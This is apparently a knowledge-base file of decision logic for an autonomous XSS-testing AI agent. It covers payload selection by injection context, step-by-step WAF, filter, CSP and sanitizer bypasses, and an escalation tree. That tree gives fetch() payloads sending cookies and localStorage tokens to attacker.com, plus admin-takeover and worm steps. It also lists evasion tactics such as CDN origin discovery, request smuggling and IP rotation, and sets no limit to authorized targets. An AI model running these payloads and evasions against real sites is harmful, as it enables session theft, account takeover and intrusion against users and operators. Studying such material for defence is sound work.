# 40 - XSS Agent Decision Logic

## Overview

This document defines the complete decision-making logic for the autonomous XSS testing agent. It provides structured decision trees for every critical juncture during testing: XSS type selection, context detection, bypass strategy, exploitation escalation, false positive elimination, and error recovery. Each decision tree is designed to be machine-executable -- the agent traverses these trees during testing to make deterministic, optimal choices.

**Cross-references**: Methodology phases in `39-agent-methodology.md`, integration protocols in `41-agent-integration.md`, payload libraries in KB files `03` through `38`.

---

## 1. Master Decision Tree: XSS Type Selection

The first decision after target profiling determines which XSS type to prioritize.

```
TARGET RECEIVED
  |
  v
[1] Analyze rendering model
  |
  +---> Is the application a Single Page Application (SPA)?
  |     (Indicators: React/Angular/Vue detected, client-side routing,
  |      heavy JS bundle, __NEXT_DATA__ / __NUXT__ present)
  |     |
  |     +---> YES: Prioritize DOM XSS testing (Phase 4 of methodology)
  |     |         - Enumerate DOM sources (location.*, document.URL, postMessage)
  |     |         - Trace source-to-sink flows in JS bundles
  |     |         - Test hash-based routing injection
  |     |         - Test postMessage handlers
  |     |         - THEN: Reflected XSS on SSR endpoints
  |     |         - THEN: Stored XSS in user content
  |     |
  |     +---> NO: Continue to [2]
  |
  v
[2] Analyze user content model
  |
  +---> Does the application store and display user-generated content?
  |     (Indicators: comment systems, user profiles, messaging,
  |      forums, CMS, social features, file uploads)
  |     |
  |     +---> YES: Prioritize Stored XSS testing
  |     |         - Test all user input storage points
  |     |         - Test rich text / WYSIWYG editors
  |     |         - Test file upload (SVG, HTML, metadata)
  |     |         - Test second-order XSS (store in one context, trigger in another)
  |     |         - THEN: Reflected XSS on search/filter endpoints
  |     |         - THEN: DOM XSS
  |     |
  |     +---> NO: Continue to [3]
  |
  v
[3] Default: Prioritize Reflected XSS
  |
  +---> Test all URL parameters for reflection
  +---> Test POST body parameters for reflection
  +---> Test header injection (Referer, X-Forwarded-For)
  +---> THEN: DOM XSS
  +---> THEN: Stored XSS (if any storage points exist)
  |
  v
[4] ALWAYS (parallel with above):
  |
  +---> Deploy Blind XSS payloads to ALL of:
        - Contact forms / support tickets
        - Feedback forms
        - Registration fields (display name, bio, address)
        - HTTP headers: User-Agent, Referer
        - Error reporting / logging mechanisms
        - File upload metadata (filename, EXIF)
        - API fields consumed by admin dashboards
```

---

## 2. Decision Tree: Context Detection and Payload Selection

After identifying a reflection point, determine the exact injection context and select payloads accordingly.

```
INPUT REFLECTED IN RESPONSE
  |
  v
[1] Locate reflection in response body
  |
  +---> Where does the reflection appear?
        |
        +---> BETWEEN HTML TAGS (e.g., inside <div>..REFLECTED..</div>)
        |     |
        |     +---> Are angle brackets < > unencoded?
        |     |     +---> YES: Inject tag payloads
        |     |     |     Priority order:
        |     |     |     1. <img src=x onerror=alert(1)> (no interaction)
        |     |     |     2. <svg onload=alert(1)> (no interaction)
        |     |     |     3. <details open ontoggle=alert(1)> (no interaction)
        |     |     |     4. <script>alert(1)</script> (often filtered)
        |     |     |
        |     |     +---> NO (< > are encoded to &lt; &gt;):
        |     |           Cannot inject new tags in this context.
        |     |           Check if input also appears in other contexts.
        |     |           Consider: Template injection {{7*7}} if framework detected.
        |     |
        |     +---> Is the reflection inside a special raw-text element?
        |           (<textarea>, <title>, <noscript>, <style>, <script>, <xmp>, <iframe>)
        |           +---> YES: Must close the parent element first
        |                 Example: </textarea><img src=x onerror=alert(1)>
        |                          </title><img src=x onerror=alert(1)>
        |
        +---> INSIDE AN HTML ATTRIBUTE VALUE
        |     |
        |     +---> Which quote type wraps the attribute?
        |     |     +---> Double quote: value="REFLECTED"
        |     |     |     Breakout: " onfocus=alert(1) autofocus "
        |     |     |     Or: "><img src=x onerror=alert(1)>
        |     |     |
        |     |     +---> Single quote: value='REFLECTED'
        |     |     |     Breakout: ' onfocus=alert(1) autofocus '
        |     |     |     Or: '><img src=x onerror=alert(1)>
        |     |     |
        |     |     +---> No quotes: value=REFLECTED
        |     |     |     Breakout: SPACE + onfocus=alert(1) autofocus
        |     |     |     Or: ><img src=x onerror=alert(1)>
        |     |     |
        |     |     +---> Backtick (IE only): value=`REFLECTED`
        |     |           Breakout: ` onfocus=alert(1) autofocus `
        |     |
        |     +---> Is the attribute a URL-type? (href, src, action, formaction, data, poster)
        |     |     +---> YES: Try javascript: protocol
        |     |     |     javascript:alert(1)
        |     |     |     javascript:alert(document.domain)
        |     |     |     With encoding: &#106;avascript:alert(1)
        |     |     |
        |     |     +---> NO: Use event handler injection (see breakout above)
        |     |
        |     +---> Are quotes encoded but angle brackets are not?
        |           +---> YES: Cannot break out of attribute; inject new tag instead
        |                 >CLOSE_TAG<img src=x onerror=alert(1)>
        |
        +---> INSIDE A JAVASCRIPT BLOCK (<script>...</script>)
        |     |
        |     +---> Is the reflection inside a JS string?
        |     |     +---> Inside double-quoted string: var x = "REFLECTED"
        |     |     |     Breakout: ";alert(1);//
        |     |     |     Or: "</script><img src=x onerror=alert(1)>
        |     |     |
        |     |     +---> Inside single-quoted string: var x = 'REFLECTED'
        |     |     |     Breakout: ';alert(1);//
        |     |     |     Or: '</script><img src=x onerror=alert(1)>
        |     |     |
        |     |     +---> Inside template literal: var x = `REFLECTED`
        |     |     |     Expression injection: ${alert(1)}
        |     |     |
        |     |     +---> Backslash escapes quotes?
        |     |           Try: \" to produce \\" (escapes the escape)
        |     |           Try: </script> to exit script context entirely
        |     |           Try: Unicode line terminators: \u2028 or \u2029
        |     |
        |     +---> Is the reflection inside a JS expression? (e.g., if(REFLECTED))
        |     |     Inject: );alert(1);//
        |     |     Or: ,alert(1)//
        |     |
        |     +---> Is the reflection in a JSONP callback?
        |           Inject: alert(1)// or callback=alert
        |
        +---> INSIDE AN HTML COMMENT (<!-- REFLECTED -->)
        |     Breakout: --><img src=x onerror=alert(1)>
        |     Or: --!><img src=x onerror=alert(1)>
        |
        +---> INSIDE SVG/MATHML FOREIGN CONTENT
        |     Use SVG-specific payloads:
        |     <svg><animate onbegin=alert(1) attributeName=x dur=1s>
        |     <math><mtext><img src=x onerror=alert(1)>
        |     Namespace confusion: MathML -> HTML parser switch
        |
        +---> INSIDE CSS (<style> or style="")
        |     Modern: CSS exfiltration via attribute selectors
        |     Legacy: expression(alert(1)) for IE only
        |     @import url(https://attacker.com/steal.css)
        |
        +---> NOT REFLECTED IN RESPONSE (but input is processed)
              |
              +---> Check DOM for client-side reflection
              |     (Input may be written to DOM via JavaScript)
              |     +---> YES: DOM XSS -- trace source to sink
              |     +---> NO: Continue
              |
              +---> Submit and check if input appears later (stored context)
              |     +---> YES: Stored XSS -- test with harmless then escalate
              |     +---> NO: Continue
              |
              +---> Deploy blind XSS payload
                    Input may be consumed by admin/internal panel
```

---

## 3. Decision Tree: Bypass Strategy Selection

When initial payloads are blocked, systematically identify the filtering mechanism and select the appropriate bypass.

```
PAYLOAD BLOCKED
  |
  v
[1] Identify blocking mechanism
  |
  +---> HTTP 403 / Block page / CAPTCHA returned?
  |     +---> YES: WAF is blocking --> Go to WAF Bypass Tree (3.1)
  |     +---> NO: Continue
  |
  +---> Payload reflected but modified/stripped?
  |     +---> YES: Server-side filter active --> Go to Filter Bypass Tree (3.2)
  |     +---> NO: Continue
  |
  +---> Payload reflected intact but no execution?
  |     +---> YES: Check browser console for CSP violation
  |     |     +---> CSP violation found: --> Go to CSP Bypass Tree (3.3)
  |     |     +---> No CSP violation: Check for sanitizer (DOMPurify, etc.)
  |     |           --> Go to Sanitizer Bypass Tree (3.4)
  |     +---> NO: Payload not reflected at all --> Re-check input handling
  |
  v

### 3.1 WAF Bypass Decision Tree

WAF DETECTED
  |
  v
[A] Identify WAF vendor (wafw00f, response headers, block page fingerprint)
  |
  +---> Cloudflare?
  |     Step 1: Obfuscated event handlers: <svg/onload=confirm(1)>
  |     Step 2: Uncommon tags: <details/open/ontoggle=alert(1)>
  |     Step 3: Encoding chains: <img src=x onerror=&#97;lert(1)>
  |     Step 4: Chunked transfer encoding (if applicable)
  |     Step 5: IP-based origin bypass (find real IP behind CDN)
  |     Full list: KB file 17-waf-bypass-xss.md
  |
  +---> AWS WAF?
  |     Step 1: Unicode normalization bypasses
  |     Step 2: Case variation on tags and attributes
  |     Step 3: Payload in POST body (if WAF only inspects GET)
  |     Step 4: Content-Type manipulation
  |     Full list: KB file 17-waf-bypass-xss.md
  |
  +---> Akamai?
  |     Step 1: Comment insertion in tags
  |     Step 2: Double encoding
  |     Step 3: JavaScript constructor chains
  |     Full list: KB file 17-waf-bypass-xss.md
  |
  +---> ModSecurity (OWASP CRS)?
  |     Step 1: Paranoia level detection (lower levels have more gaps)
  |     Step 2: Uncommon tags not in CRS ruleset
  |     Step 3: Encoding bypass past regex patterns
  |     Full list: KB file 17-waf-bypass-xss.md
  |
  +---> Unknown/Custom WAF?
        Step 1: Enumerate allowed tags (brute-force tag names)
        Step 2: Enumerate allowed event handlers per allowed tag
        Step 3: Enumerate allowed JavaScript functions
        Step 4: Build payload from allowed components
        Step 5: Try encoding escalation ladder (see methodology Phase 5.3)

### 3.2 Server-Side Filter Bypass Decision Tree

FILTER DETECTED (payload modified in response)
  |
  v
[A] What was stripped/modified?
  |
  +---> Tag name removed (e.g., <script> stripped)?
  |     Try: Nested tags: <scr<script>ipt>
  |     Try: Case variation: <ScRiPt>
  |     Try: Alternative tags: <img>, <svg>, <details>, <math>, <body>
  |     Try: Null bytes: <scr%00ipt>
  |
  +---> Event handler removed (e.g., onerror stripped)?
  |     Try: Alternative events: onfocus, ontoggle, onpointerover, onbegin
  |     Try: Case variation: OnErRoR
  |     Try: Whitespace insertion: on\nerror (newline between on and error)
  |     Try: Slash separator: onerror/=alert(1)
  |
  +---> Keyword filtered (e.g., "alert" stripped)?
  |     Try: confirm(), prompt(), print()
  |     Try: String concatenation: window["al"+"ert"](1)
  |     Try: Constructor: [].constructor.constructor('alert(1)')()
  |     Try: Template literal: alert`1`
  |     Try: Unicode escapes: \u0061lert(1)
  |
  +---> Quotes stripped or encoded?
  |     Try: Backtick strings: alert`1`
  |     Try: String.fromCharCode: String.fromCharCode(88,83,83)
  |     Try: No-quote payloads: <img src=x onerror=alert(1)>
  |
  +---> Angle brackets encoded (< > to &lt; &gt;)?
  |     If inside attribute: Stay in attribute context
  |     " onfocus=alert(1) autofocus x="
  |     If inside JS: No tags needed, use JS breakout
  |     Cannot inject new HTML tags -- pivot strategy
  |
  +---> Multiple elements filtered?
        Combine bypass techniques:
        Uncommon tag + uncommon event + obfuscated function
        Example: <details open ontoggle=confirm(1)>
        Example: <math><mi/onpointerover=prompt(1)>hover</mi></math>

### 3.3 CSP Bypass Decision Tree

CSP BLOCKS EXECUTION
  |
  v
[A] Parse CSP policy directives
  |
  +---> Is 'unsafe-inline' in script-src?
  |     +---> YES: CSP is not blocking inline scripts (re-check issue)
  |     +---> NO: Continue
  |
  +---> Is 'unsafe-eval' in script-src?
  |     +---> YES: Find a code path that passes user input to
  |           Function(), setTimeout(string), or setInterval(string)
  |
  +---> Is data: in script-src?
  |     +---> YES: <script src="data:text/javascript,alert(1)"></script>
  |
  +---> Are JSONP-capable domains whitelisted?
  |     +---> YES: Use JSONP callback for script execution
  |           <script src="https://whitelisted.com/api?callback=alert(1)//"></script>
  |           Check JSONBee database for known JSONP endpoints
  |
  +---> Are CDN domains whitelisted that serve old Angular?
  |     +---> YES: Load AngularJS 1.x and use ng-app sandbox bypass
  |           <script src="https://whitelisted-cdn.com/angular/1.5.8/angular.min.js"></script>
  |           <div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
  |
  +---> Is base-uri unrestricted?
  |     +---> YES: Inject <base href="https://attacker.com/"> to hijack relative script paths
  |
  +---> Is there nonce leakage?
  |     +---> Check meta tags, data attributes, and JS variables for nonce value
  |     +---> If found: Use leaked nonce in injected <script nonce="LEAKED">
  |
  +---> Does policy use 'strict-dynamic'?
  |     +---> Find a nonced/hashed script that dynamically creates script elements
  |           Leverage it as a gadget to load attacker-controlled code
  |
  +---> None of the above?
        +---> CSP-compatible attacks:
              - Dangling markup injection for data exfiltration
              - CSS injection for token/data theft via attribute selectors
              - Form action hijacking (if form-action unrestricted)
              - DNS prefetch exfiltration (connect-src may not block)
              - Document as "hardened against XSS execution"

### 3.4 Sanitizer Bypass Decision Tree

CLIENT-SIDE SANITIZER DETECTED
  |
  v
[A] Identify sanitizer
  |
  +---> DOMPurify detected?
  |     Check version (older versions have known bypasses)
  |     Try: mXSS (mutation XSS) payloads
  |     Try: Custom allowed tags/attributes configuration gaps
  |     Try: Namespace confusion (SVG/MathML/HTML nesting)
  |     See KB file 16-sanitizer-bypass-client.md
  |
  +---> Angular DomSanitizer?
  |     Look for bypassSecurityTrustHtml() usage in source
  |     If found: Input to bypassed sanitizer = direct XSS
  |
  +---> Custom sanitizer?
        Fuzz with: mXSS payloads, encoding variations
        Try: Parser differential (how server parser differs from browser parser)
        Try: DOM clobbering to override sanitizer references
        See KB file 18-advanced-bypass-techniques.md
```

---

## 4. Decision Tree: Exploitation Escalation

After confirming XSS execution, determine the maximum achievable impact.

```
XSS CONFIRMED (alert/callback fires)
  |
  v
[1] Assess session management
  |
  +---> Are session cookies accessible via document.cookie?
  |     (Check: Are cookies HttpOnly? Inspect Set-Cookie headers)
  |     |
  |     +---> YES (cookies readable):
  |     |     Action: Cookie theft + session hijacking
  |     |     Payload: fetch('https://attacker.com/steal',{method:'POST',mode:'no-cors',body:document.cookie})
  |     |     Impact: Full session hijacking, account takeover
  |     |
  |     +---> NO (HttpOnly set):
  |           Continue to [2]
  |
  v
[2] Check for JS-accessible tokens
  |
  +---> Are auth tokens stored in localStorage/sessionStorage?
  |     +---> YES: Exfiltrate tokens
  |           Payload: fetch('https://attacker.com/steal',{method:'POST',mode:'no-cors',body:localStorage.getItem('token')})
  |
  +---> Are tokens in JavaScript variables or DOM elements?
  |     +---> YES: Extract from page context
  |           Search for: window.token, __INITIAL_STATE__, data-token attributes
  |
  +---> Are CSRF tokens accessible?
  |     +---> YES: Use XSS to perform authenticated actions as victim
  |           Action: Change email, change password, add admin user
  |
  v
[3] Assess application context
  |
  +---> Is the XSS in an admin-facing panel?
  |     +---> YES: Maximum impact -- admin ATO
  |           Actions: Create new admin, change admin password,
  |           exfiltrate sensitive data, modify application settings
  |
  +---> Is the XSS stored and visible to other users?
  |     +---> YES: Mass impact -- worm potential
  |           Can the payload self-replicate? (inject itself into other users' content)
  |           If yes: Stored XSS worm (critical severity)
  |
  +---> Is the application an Electron desktop app?
  |     +---> YES: Check for nodeIntegration or contextIsolation bypass
  |           If nodeIntegration enabled: XSS -> RCE via require('child_process')
  |           See KB file 21-exploitation-rce-advanced.md
  |
  +---> Is the application in a mobile WebView?
  |     +---> YES: Check for JavaScript bridge to native code
  |           Potential: Access camera, contacts, file system via bridge
  |
  +---> Is the application on an internal network?
  |     +---> YES: Use XSS for internal network scanning/pivoting
  |           Payload: Use fetch() to probe internal IPs and services
  |
  v
[4] Determine final severity rating
  |
  +---> Cookie theft possible? --> CRITICAL (full session hijack)
  +---> Token theft possible? --> CRITICAL (full account takeover)
  +---> Admin ATO possible? --> CRITICAL
  +---> Stored + mass user impact? --> CRITICAL
  +---> Authenticated action execution? --> HIGH
  +---> Data exfiltration only? --> HIGH
  +---> Phishing overlay credible? --> HIGH
  +---> Reflected, limited data access? --> MEDIUM
  +---> Self-XSS (requires social engineering)? --> LOW-MEDIUM
```

---

## 5. Error Recovery and Adaptive Behavior Logic

### 5.1 WAF Block Recovery

```
WAF BLOCKS ALL PAYLOADS
  |
  v
Step 1: Reduce payload complexity
  - Test single character: < (is angle bracket alone blocked?)
  - Test benign tag: <b>test</b> (are all tags blocked or just dangerous ones?)
  - Test benign attribute: <div class=test> (are attributes blocked?)
  |
  v
Step 2: Enumerate allowed components
  - Brute-force tag names (use PortSwigger cheat sheet approach)
  - For each allowed tag, brute-force event handlers
  - For each allowed event, test function names
  |
  v
Step 3: Build payload from allowed components
  - Construct minimum viable payload from enumerated allowlist
  |
  v
Step 4: If all blocked, escalate
  - Try different input vectors (POST instead of GET, headers, cookies)
  - Try different Content-Type (multipart/form-data, application/json)
  - Try request smuggling to bypass WAF inspection
  - Try IP rotation if rate-limited
  - Document WAF as blocking all known vectors and move on
```

### 5.2 CSP Violation Recovery

```
CSP BLOCKS ALL EXECUTION
  |
  v
Step 1: Re-read CSP policy carefully (missed directives?)
Step 2: Check EVERY whitelisted domain for JSONP/gadgets
Step 3: Check for CSP header on all pages (some pages may have weaker CSP)
Step 4: Check subdomains for different CSP policies
Step 5: If strict-dynamic, analyze all nonced scripts for gadget potential
Step 6: Pivot to non-execution attacks (dangling markup, CSS exfiltration)
Step 7: Document policy strength assessment and move on
```

### 5.3 Encoding Issue Recovery

```
PAYLOAD GARBLED/DOUBLE-ENCODED IN RESPONSE
  |
  v
Step 1: Identify encoding chain
  - What encoding is applied? (HTML entity, URL, Unicode, Base64)
  - How many times is encoding applied?
  |
  v
Step 2: Pre-encode payload to compensate
  - If server URL-decodes once: Use single URL encoding
  - If server URL-decodes twice: Use double URL encoding
  - If server HTML-entity-decodes: Use HTML entities in payload
  |
  v
Step 3: Test encoding combinations
  - Mixed encoding: URL-encode some chars, HTML-entity others
  - Overlong UTF-8 sequences
  - Unicode normalization exploitation
```

### 5.4 Unexpected Response Handling

```
UNEXPECTED RESPONSE (not 200, not WAF block)
  |
  +---> HTTP 500 (Server Error)?
  |     Payload may be causing crash -- reduce payload complexity
  |     Could indicate: SQL injection, template injection, or SSRF
  |     Log for further investigation with appropriate agent
  |
  +---> HTTP 302/301 (Redirect)?
  |     Check if redirect URL contains reflection
  |     Check Location header for injection
  |     Follow redirect and check destination page
  |
  +---> HTTP 429 (Rate Limited)?
  |     Slow down request rate
  |     Rotate IP/proxy if available
  |     Focus on high-priority inputs first
  |
  +---> Empty response body?
  |     Check response headers for reflection
  |     Try different Accept header (text/html vs application/json)
  |
  +---> Different Content-Type than expected?
        Server may return JSON/XML/plain text
        Adapt payload to response Content-Type
        Check for MIME sniffing opportunities
```

---

## 6. False Positive Elimination

### 6.1 Confirmation Criteria

An XSS finding is confirmed TRUE POSITIVE only when ALL of the following are met:

1. **Execution verified**: `alert()`, `confirm()`, `prompt()`, or callback server receives the ping
2. **Reproducible**: The same steps produce the same result on a fresh browser session
3. **No self-XSS**: The payload can be delivered to a victim via URL, stored content, or other vector (not just pasting into own console)
4. **Browser-independent** (preferred): Works in at least Chrome or Firefox (latest stable)
5. **Cross-origin delivery possible**: The attacker does not need to be authenticated as the victim to trigger the XSS

### 6.2 Common False Positive Patterns

| Pattern | Why It Is False Positive | How to Verify |
|---------|------------------------|---------------|
| Payload in response but not in DOM | Source code reflection only, never parsed as HTML | Check rendered DOM, not just response source |
| Payload in JSON response with correct Content-Type | Browser treats as data, not HTML | Verify Content-Type is `application/json` with `X-Content-Type-Options: nosniff` |
| Payload in HTTP header only | Headers are not rendered | Confirm no response splitting or injection into body |
| Payload in non-rendered context (e.g., hidden input without event) | No execution path | Verify no user interaction chain triggers it |
| Alert fires but origin is not the target | Cross-origin frame or data: URL | Verify `document.domain` in alert matches target |

---

## 7. Priority Scoring Algorithm

When multiple XSS candidates are found, prioritize testing by this weighted score:

```
SCORE = (Context_Weight * 3) + (Storage_Weight * 2) + (Access_Weight * 2) + (CSP_Weight * 1) + (Filter_Weight * 1)

Context_Weight:
  HTML body, unencoded reflection    = 10
  HTML attribute, quote not encoded  = 8
  JavaScript string context          = 7
  URL attribute (href/src)           = 7
  DOM source-to-sink flow exists     = 6
  HTML comment context               = 4
  CSS context                        = 3
  Encoded/filtered reflection        = 2

Storage_Weight:
  Stored (persistent)                = 10
  Reflected (URL parameter)          = 5
  DOM-based (client only)            = 4
  Blind (unknown trigger)            = 7

Access_Weight:
  Unauthenticated                    = 10
  Authenticated (any user)           = 7
  Authenticated (specific role)      = 5
  Admin-only input                   = 8 (high value if blind)

CSP_Weight:
  No CSP                             = 10
  CSP with unsafe-inline             = 9
  CSP with known bypass              = 6
  Strict CSP, no known bypass        = 1

Filter_Weight:
  No filtering detected              = 10
  Basic filter (easily bypassed)     = 7
  WAF (vendor-specific bypass known) = 4
  WAF (no bypass found yet)          = 1
  Client-side sanitizer only         = 6
```

**Priority ranking**: Test candidates with the highest composite score first. This ensures the agent spends time on the most likely and highest-impact findings.

---

## Key Takeaways

1. **Decision trees are deterministic**: The agent follows explicit branching logic at each step, not guesswork.
2. **Context detection precedes payload selection**: Never spray payloads without understanding the injection context.
3. **Bypass is systematic**: Identify what is blocked, then select the specific bypass for that filter/WAF/CSP mechanism.
4. **Exploitation escalation maximizes impact**: Always push beyond `alert(1)` to demonstrate real-world consequences.
5. **False positive elimination is mandatory**: Every finding must be verified against the confirmation criteria before reporting.
6. **Priority scoring optimizes time**: Focus on the highest-scoring candidates to maximize findings per hour of testing.
